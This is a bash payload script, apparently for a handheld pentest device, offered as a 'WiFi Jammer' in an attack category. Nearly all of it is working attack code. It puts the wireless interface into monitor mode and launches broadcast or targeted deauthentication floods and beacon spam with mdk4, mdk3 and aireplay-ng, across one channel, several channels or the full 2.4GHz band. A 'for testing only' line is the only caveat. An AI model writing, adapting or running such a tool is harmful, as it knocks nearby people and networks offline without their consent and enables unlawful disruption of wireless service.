#!/bin/bash
# Title: WiFi Jammer
# Author: bad-antics  
# Description: Selective or full spectrum WiFi disruption
# Category: nullsec/attack

PROMPT "WIFI JAMMER

Disrupt WiFi on selected
channels or full 2.4GHz.

Multiple jam modes:
- Deauth flood
- Beacon flood
- Noise injection

For testing only.
Press OK to continue."

INTERFACE="wlan0"

PROMPT "JAM MODE:

1. Single Channel
2. Channel Hop (1,6,11)
3. Full Spectrum (all)
4. Target Network Only

Enter mode next."

JAM_MODE=$(NUMBER_PICKER "Mode (1-4):" 1)

case $JAM_MODE in
    1)
        CHANNEL=$(NUMBER_PICKER "Channel (1-14):" 6)
        CHANNELS="$CHANNEL"
        ;;
    2)
        CHANNELS="1 6 11"
        ;;
    3)
        CHANNELS="1 2 3 4 5 6 7 8 9 10 11 12 13"
        ;;
    4)
        # Need to scan first
        TARGET_BSSID=$(MAC_PICKER "Target BSSID:")
        CHANNELS="scan"
        ;;
esac

PROMPT "JAM TYPE:

1. Deauth Flood
2. Beacon Spam
3. Combined Attack

Enter type next."

JAM_TYPE=$(NUMBER_PICKER "Type (1-3):" 1)
DURATION=$(NUMBER_PICKER "Duration (sec):" 60)

resp=$(CONFIRMATION_DIALOG "START JAMMING?

Mode: $JAM_MODE
Duration: ${DURATION}s

This WILL disrupt
nearby WiFi networks.

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# Prepare
airmon-ng check kill 2>/dev/null
sleep 1
airmon-ng start $INTERFACE >/dev/null 2>&1
MON_IF="${INTERFACE}mon"
[ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"

LOG "Starting jammer..."
SPINNER_START "Jamming WiFi..."

# Jamming function
jam_channel() {
    local CH=$1
    iwconfig $MON_IF channel $CH 2>/dev/null
    
    if [ "$JAM_TYPE" = "1" ] || [ "$JAM_TYPE" = "3" ]; then
        # Deauth flood using mdk3/mdk4
        if command -v mdk4 &>/dev/null; then
            mdk4 $MON_IF d 2>/dev/null &
        elif command -v mdk3 &>/dev/null; then
            mdk3 $MON_IF d 2>/dev/null &
        else
            # Fallback to aireplay broadcast deauth
            aireplay-ng --deauth 0 -a FF:FF:FF:FF:FF:FF $MON_IF 2>/dev/null &
        fi
    fi
    
    if [ "$JAM_TYPE" = "2" ] || [ "$JAM_TYPE" = "3" ]; then
        # Beacon spam
        if command -v mdk4 &>/dev/null; then
            mdk4 $MON_IF b -c $CH 2>/dev/null &
        elif command -v mdk3 &>/dev/null; then
            mdk3 $MON_IF b -c $CH 2>/dev/null &
        fi
    fi
}

# Single target mode
if [ "$CHANNELS" = "scan" ]; then
    # Get channel for target
    TEMP_DIR="/tmp/jam_$$"
    mkdir -p "$TEMP_DIR"
    timeout 5 airodump-ng $MON_IF -w "$TEMP_DIR/scan" --output-format csv 2>/dev/null &
    sleep 5
    
    TARGET_CH=$(grep "$TARGET_BSSID" "$TEMP_DIR/scan-01.csv" 2>/dev/null | head -1 | cut -d',' -f4 | tr -d ' ')
    TARGET_CH=${TARGET_CH:-6}
    
    rm -rf "$TEMP_DIR"
    
    iwconfig $MON_IF channel $TARGET_CH 2>/dev/null
    aireplay-ng --deauth 0 -a "$TARGET_BSSID" $MON_IF 2>/dev/null &
    
    sleep $DURATION
else
    # Multi-channel jam
    END_TIME=$(($(date +%s) + DURATION))
    
    while [ $(date +%s) -lt $END_TIME ]; do
        for CH in $CHANNELS; do
            jam_channel $CH
            sleep 2
        done
        
        # Kill previous processes
        killall mdk3 mdk4 aireplay-ng 2>/dev/null
    done
fi

# Cleanup
killall mdk3 mdk4 aireplay-ng 2>/dev/null
SPINNER_STOP
airmon-ng stop $MON_IF 2>/dev/null

PROMPT "JAMMING COMPLETE

Duration: ${DURATION}s
Mode: $JAM_MODE
Type: $JAM_TYPE

WiFi disruption ended.

Press OK to exit."
